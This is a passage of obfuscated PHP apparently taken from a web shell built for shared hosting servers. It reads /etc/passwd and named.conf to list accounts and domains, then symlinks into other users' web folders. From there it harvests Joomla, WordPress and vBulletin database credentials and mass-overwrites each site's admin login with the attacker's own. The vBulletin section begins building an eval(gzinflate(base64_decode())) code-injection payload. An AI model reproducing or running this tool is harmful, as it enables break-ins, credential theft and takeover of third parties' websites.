$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMTFJ')]($file);
}
else if (!$IIIIIIII11II)
{
$IIIIIIII111l = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbEls')]($file,$GLOBALS['OOO0000O0']('c3ltLnR4dA=='));
if ($IIIIIIII111l){
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('c3ltL3N5bS50eHQ='),$GLOBALS['OOO0000O0']('cg=='));
$IIIIIIII11Il = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMUkx')]($IIIIIIII11II,@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxJ')]($file));
echo $GLOBALS['OOO0000O0']('').$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxs')]($IIIIIIII11Il).$GLOBALS['OOO0000O0']('');
}
}
echo "</textarea><br /><br /><input  type='submit' value='Save'/> </form>";
if(isset($_GET[$GLOBALS['OOO0000O0']('c2F2ZQ==')])){
$IIIIIIII1111 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJSUlJ')]($_POST[$GLOBALS['OOO0000O0']('ZmlsZQ==')]);
$IIIIIIIIII1l = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'),$GLOBALS['OOO0000O0']('dw=='));
$w = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l,$IIIIIIII1111);
if($w){
echo $GLOBALS['OOO0000O0']('PGJyIC8+c2F2ZSBoYXMgYmVlbiBzdWNjZXNzZnVsbHk=');
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJSUkx')]($IIIIIIIIII1l);
}
break;
case $GLOBALS['OOO0000O0']('cGFzc3dk'):
if(isset($_GET[$GLOBALS['OOO0000O0']('c2F2ZQ==')]) and isset($_POST[$GLOBALS['OOO0000O0']('ZmlsZQ==')]) or @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxJ')]($GLOBALS['OOO0000O0']('cGFzc3dkLnR4dA==')) >0){
$IIIIIIII1111 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJSUlJ')]($_POST[$GLOBALS['OOO0000O0']('ZmlsZQ==')]);
if(!file_exists($GLOBALS['OOO0000O0']('cGFzc3dkLnR4dA=='))){
$IIIIIIIIII1l = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('cGFzc3dkLnR4dA=='),$GLOBALS['OOO0000O0']('dw=='));
$w = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l,$IIIIIIII1111);
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJSUkx')]($IIIIIIIIII1l);
}
if($w or @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxJ')]($GLOBALS['OOO0000O0']('cGFzc3dkLnR4dA==')) >0){
echo "<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIIlIIlI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('cGFzc3dkLnR4dA=='));
foreach ($IIIIIIIlIIlI as $IIIIIIIIII1l){
$IIIIIIIIIII1=$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('Og=='),$IIIIIIIIII1l);
$IIIIIIIII1ll = $IIIIIIIIIII1[$GLOBALS['OOO0000O0']('MA==')];
echo "
<tr>



<td width='15%'>
$IIIIIIIII1ll
</td>






<td width='10%'>
<a href='sym/root/home/$IIIIIIIII1ll/public_html' target='_blank'>Symlink </a>
</td>

<td width='10%'>
<a href='$IIIIIIIIIIl1/sym/root/home/$IIIIIIIII1ll/public_html' target='_blank'>FTP</a>
</td>



</tr></div> ";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
die ($GLOBALS['OOO0000O0']('PC90cj48L2Rpdj4='));
}
}
echo $GLOBALS['OOO0000O0']('cmVhZCAvZXRjL3Bhc3N3ZA==');
echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$file = $GLOBALS['OOO0000O0']('L2V0Yy9wYXNzd2Q=');
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($file,$GLOBALS['OOO0000O0']('cg=='));
if ($IIIIIIII11II){
$IIIIIIII11Il = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMUkx')]($IIIIIIII11II,@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxJ')]($file));
echo $GLOBALS['OOO0000O0']('').$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxs')]($IIIIIIII11Il).$GLOBALS['OOO0000O0']('');
}
elseif(!$IIIIIIII11II)
{
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWwx')]($file) ;
}
elseif(!$IIIIIIII11II)
{
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMTFJ')]($file);
}
elseif(!$IIIIIIII11II)
{
for($IIIIIIIlIIll=0;$IIIIIIIlIIll<1000;$IIIIIIIlIIll++){
$IIIIIIIlIIl1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')]($IIIIIIIlIIll);
if (!empty($IIIIIIIlIIl1)) {
while (list ($IIIIIIIlII1I,$IIIIIIIlII1l) = each($IIIIIIIlIIl1)){
print "$IIIIIIIlII1l:";
}
print "\n";
}
}
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
echo "</textarea><br /><br /><input  type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
break;
case $GLOBALS['OOO0000O0']('am9vbWxh'):
if(isset($_POST[$GLOBALS['OOO0000O0']('cw==')])){
$file = @file_get_contents($GLOBALS['OOO0000O0']('am9vbWxhLnR4dA=='));
$IIIIIIIlII11   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]("\n",$file);
echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
foreach ($IIIIIIIlII11 as $IIIIIIIlIlII){
$IIIIIIIlIlIl   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('fHw='),$IIIIIIIlIlII);
$IIIIIIII1I11 = $IIIIIIIlIlIl[0];
$IIIIIIIlIlI1 = $IIIIIIIlIlIl[1];
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
$IIIIIIIlIlll  = @file_get_contents($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIII1I11));
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJbGwx')]($GLOBALS['OOO0000O0']('SkNvbmZpZw=='),$IIIIIIIlIlll)){
$IIIIIIIlIl1I    =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JHBhc3N3b3JkID0gJw=='),"';");
$IIIIIIIlIl1l  =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JHVzZXIgPSAn'),"';");
$IIIIIIIlIl11      =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JGRiID0gJw=='),"';");
$IIIIIIIlI1II     =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JGRicHJlZml4ID0gJw=='),"';");
$IIIIIIIlI1Il     =  $IIIIIIIlI1II.$GLOBALS['OOO0000O0']('dXNlcnM=');
$IIIIIIIlI1I1     = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWxJ')]($GLOBALS['OOO0000O0']('bG9jYWxob3N0'),$IIIIIIIlIl1l,$IIIIIIIlIl1I);
$IIIIIIIlIl11      = @mysql_select_db($IIIIIIIlIl11,$IIIIIIIlI1I1);
$IIIIIIIlI1ll   = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWwx')]("UPDATE `$IIIIIIIlI1Il`  SET `username` ='sec-w.com'");
$IIIIIIIlI11I  = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWwx')]("UPDATE `$IIIIIIIlI1Il`  SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");
if ($IIIIIIIlI1ll and $IIIIIIIlI11I ){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TdWNjZWVkIDwvYj51c2VyIFtzZWMtdy5jb21dIHBhc3MgWzFdPC9iPg==');}else{$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');}
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}else{
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='http://$IIIIIIIlIlII'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
die();
}
if(!$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxs')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'))){
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m'));
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}else{
$IIIIIIIIIll1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'));
}
if(!$IIIIIIIIIll1)
{
die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else
{
echo "<div class='tmp'>
<form method='POST' action='$IIIIIIIIIlI1?sws=joomla'>
<input type='submit' value='Mass ching Admin' />
<input type='hidden' value='1' name='s' />
</form><br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
$IIIIIIIIII1l = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('am9vbWxhLnR4dA=='),$GLOBALS['OOO0000O0']('dw=='));
foreach($IIIIIIIIIll1 as $IIIIIIIIIl1l){
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUlJ')]($GLOBALS['OOO0000O0']('em9uZQ=='),$IIIIIIIIIl1l)){
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUls')]($GLOBALS['OOO0000O0']('I3pvbmUgIiguKikiIw=='),$IIIIIIIIIl1l,$IIIIIIIII1I1);
if(strlen($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1ll = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')](@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMTFJ')]($GLOBALS['OOO0000O0']('L2V0Yy92YWxpYXNlcy8=').$IIIIIIIII1I1[1][0]));
$IIIIIIIII11l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhw');
$IIIIIIIII111=get_headers($IIIIIIIII11l);
$wp=$IIIIIIIII111[0];
$IIIIIIIIlIIl=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHA=');
$IIIIIIIIlII1=get_headers($IIIIIIIIlIIl);
$IIIIIIIIlIlI=$IIIIIIIIlII1[0];
$IIIIIIIlI111=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocA==');
$IIIIIIIllIII=get_headers($IIIIIIIlI111);
$IIIIIIIllIIl=$IIIIIIIllIII[0];
$IIIIIIII1I1I = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw'));
$IIIIIIII1I11=$GLOBALS['OOO0000O0']('Jm5ic3A7');
if ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw')) == true )
{
$IIIIIIII1I11= $IIIIIIIII11l;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlIlI,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIIlIIl;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIllIIl,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIlI111;
}
else
{
continue;
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIIIIl1l = $IIIIIIIII1I1[1][0];
$w = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l,"$IIIIIIII1I11||$IIIIIIIIIl1l \n");
if($w){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPg==');}else{$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');}
echo $GLOBALS['OOO0000O0']('PHRyPjx0ZD48YSBocmVmPWh0dHA6Ly93d3cu').$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('Pg==').$IIIIIIIII1I1[1][0]."</a></td>
<td><a href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
}
}
break;
case $GLOBALS['OOO0000O0']('d3A='):
if(isset($_POST[$GLOBALS['OOO0000O0']('cw==')])){
$file = @file_get_contents($GLOBALS['OOO0000O0']('d3AudHh0'));
$IIIIIIIlII11   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]("\n",$file);
echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
foreach ($IIIIIIIlII11 as $IIIIIIIlIlII){
$IIIIIIIlIlIl   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('fHw='),$IIIIIIIlIlII);
$IIIIIIII1I11 = $IIIIIIIlIlIl[0];
$IIIIIIIlIlI1 = $IIIIIIIlIlIl[1];
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
$IIIIIIIlIlll  = @file_get_contents($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIII1I11));
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJbGwx')]($GLOBALS['OOO0000O0']('d3Atc2V0dGluZ3MucGhw'),$IIIIIIIlIlll)){
$IIIIIIIlIl1I    =  IIIIIIIllll1($IIIIIIIlIlll,"define('DB_PASSWORD', '","');");
$IIIIIIIlIl1l  =  IIIIIIIllll1($IIIIIIIlIlll,"define('DB_USER', '","');");
$IIIIIIIlIl11      =  IIIIIIIllll1($IIIIIIIlIlll,"define('DB_NAME', '","');");
$IIIIIIIlI1II     =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JHRhYmxlX3ByZWZpeCAgPSAn'),"';");
$IIIIIIIlI1Il     = $IIIIIIIlI1II.$GLOBALS['OOO0000O0']('dXNlcnM=');
$IIIIIIIlI1I1     = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWxJ')]($GLOBALS['OOO0000O0']('bG9jYWxob3N0'),$IIIIIIIlIl1l,$IIIIIIIlIl1I);
$IIIIIIIlIl11      = @mysql_select_db($IIIIIIIlIl11,$IIIIIIIlI1I1);
$IIIIIIIlI1ll   = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWwx')]("UPDATE `$IIIIIIIlI1Il` SET `user_login` ='sec-w.com'") or die;
$IIIIIIIlI1ll   = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWwx')]("UPDATE `$IIIIIIIlI1Il` SET `user_pass` ='$IIIIIIIllII1$IIIIIIIllIlI/.5i..$IIIIIIIllIll.fUHEmNZ.eIKYTwx/'") or die;
if ($IIIIIIIlI1ll){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TdWNjZWVkIDwvYj51c2VyIFtzZWMtdy5jb21dIHBhc3MgWzFdPC9iPg==');}
else
{
$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');
}
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}else{
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='http://$IIIIIIII1I11'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
die();
}
if(!$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxs')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'))){
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m'));
}else{
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'));
}
if(!$IIIIIIIIIll1)
{
die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else
{
echo "<div class='tmp'>
<form method='POST' action='$IIIIIIIIIlI1?sws=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIIIII1l = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('d3AudHh0'),$GLOBALS['OOO0000O0']('dw=='));
foreach($IIIIIIIIIll1 as $IIIIIIIIIl1l){
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUlJ')]($GLOBALS['OOO0000O0']('em9uZQ=='),$IIIIIIIIIl1l)){
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUls')]($GLOBALS['OOO0000O0']('I3pvbmUgIiguKikiIw=='),$IIIIIIIIIl1l,$IIIIIIIII1I1);
if(strlen($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1ll = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')](@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMTFJ')]($GLOBALS['OOO0000O0']('L2V0Yy92YWxpYXNlcy8=').$IIIIIIIII1I1[1][0]));
$IIIIIIIII11l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHA=');
$IIIIIIIII111=get_headers($IIIIIIIII11l);
$wp=$IIIIIIIII111[0];
$IIIIIIIIlIIl=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocA==');
$IIIIIIIIlII1=get_headers($IIIIIIIIlIIl);
$IIIIIIIIlIlI=$IIIIIIIIlII1[0];
$IIIIIIIlI111=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZw==');
$IIIIIIIllIII=get_headers($IIIIIIIlI111);
$IIIIIIIllIIl=$IIIIIIIllIII[0];
$IIIIIIII1I1I = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw'));
$IIIIIIII1I11=$GLOBALS['OOO0000O0']('Jm5ic3A7');
if ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw')) == true )
{
$IIIIIIII1I11= $IIIIIIIII11l;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlIlI,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIIlIIl;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIllIIl,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIlI111;
}
else
{
continue;
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIIIIl1l = $IIIIIIIII1I1[1][0];
$w = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l,"$IIIIIIII1I11||$IIIIIIIIIl1l \n");
if($w){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPg==');}else{$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');}
echo $GLOBALS['OOO0000O0']('PHRyPjx0ZD48YSBocmVmPWh0dHA6Ly93d3cu').$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('Pg==').$IIIIIIIII1I1[1][0]."</a></td>
<td><a href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
}
}
break;
case $GLOBALS['OOO0000O0']('dmI='):
if(isset($_POST[$GLOBALS['OOO0000O0']('cw==')])){
$file = @file_get_contents($GLOBALS['OOO0000O0']('dmIudHh0'));
$IIIIIIIlII11   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]("\n",$file);
echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
foreach ($IIIIIIIlII11 as $IIIIIIIlIlII){
$IIIIIIIlIlIl   = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('fHw='),$IIIIIIIlIlII);
$IIIIIIII1I11 = $IIIIIIIlIlIl[0];
$IIIIIIIlIlI1 = $IIIIIIIlIlIl[1];
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
$IIIIIIIlIlll  = @file_get_contents($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIII1I11));
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJbGwx')]($GLOBALS['OOO0000O0']('dkJ1bGxldGlu'),$IIIIIIIlIlll)){
$IIIIIIIlIl11      =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JGNvbmZpZ1snRGF0YWJhc2UnXVsnZGJuYW1lJ10gPSAn'),"';");
$IIIIIIIlIl1l  =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JGNvbmZpZ1snTWFzdGVyU2VydmVyJ11bJ3VzZXJuYW1lJ10gPSAn'),"';");
$IIIIIIIlIl1I    =  IIIIIIIllll1($IIIIIIIlIlll,$GLOBALS['OOO0000O0']('JGNvbmZpZ1snTWFzdGVyU2VydmVyJ11bJ3Bhc3N3b3JkJ10gPSAn'),"';");
$IIIIIIIlI1I1     = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWxJ')]($GLOBALS['OOO0000O0']('bG9jYWxob3N0'),$IIIIIIIlIl1l,$IIIIIIIlIl1I);
$IIIIIIIlIl11      = @mysql_select_db($IIIIIIIlIl11,$IIIIIIIlI1I1);
$IIIIIIIllIl1   = $GLOBALS['OOO0000O0']('YlZEUFM4TXdGTDRML2crdllaQVdkUFBpYVV2MTRrQVFGS3FuVVVxYXBqU1lOS0ZKeENuNzMyMmFiZ3pjSWZEeXZsK1A3L3FLczA0RDN0UzVzSjk2TU1KOWIrb2hEdzh2VFdjcTMxUEYwMnlKcC9XcXp2RWFaazJyQndXVU9hRjdnaEFvN2pyZEVHUzBkUWg0ejl6ZWNJS1VsMDRZT3JoVjROODIxRkVFd1pRZ2I2U21EUjhRaU9ic2R4WWhldU1kUktOV1NINVV4dG1LbjNHK3YwUDVUSXhnTlRxaFdXUjlyWVNMQVhIL1JhVWZnWThwYlZST1o0VkkwYWF3cU41ZWkvY2REbFJjQWlGd0pFSUd2NEh5eUxUWnA0dHErL3p5Vk94d09BU1hPK3lVcVVJNkxtL2dIeGlCTERpYzZvNjJVSGpHdUxXUUpFa285OVQ5R2c3QXBlVVhKRnNxNUVYK0FSN3lQdz09') ;
$IIIIIIIllI1I  = "{\${eval(gzinflate(base64_decode(\'";
$IIIIIIIllI1I .= "$IIIIIIIllIl1";
$IIIIIIIllI1I .= "\')))}}{\${exit()}}</textarea>";
